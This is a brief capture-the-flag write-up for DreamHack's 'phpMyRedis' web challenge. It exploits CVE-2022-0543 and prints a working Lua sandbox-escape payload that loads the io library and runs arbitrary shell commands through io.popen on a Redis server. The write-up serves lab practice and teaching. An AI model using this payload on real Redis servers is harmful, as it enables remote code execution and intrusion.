# phpMyRedis — DreamHack

> **Room / Challenge:** phpMyRedis (Web)

---

## Metadata

- **Author:** `jameskaois`
- **CTF:** DreamHack
- **Challenge:** phpMyRedis (web)
- **Link**: `https://dreamhack.io/wargame/challenges/420`
- **Level:** `3`
- **Date:** `04-12-2025`

---

## Goal

The app is vulnerable to CVE-2022-0543, leveraging this and get the flag.

## My Solution

The app is vulnerable to CVE-2022-0543 which we can use RCE to get the flag. For more information, explore this repo: https://github.com/JacobEbben/CVE-2022-0543.

The payload we need to submit in `/index.php`:

```
local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("{payload}", "r"); local res = f:read("*a"); f:close(); return res
```

Use this payload to easily get the flag.
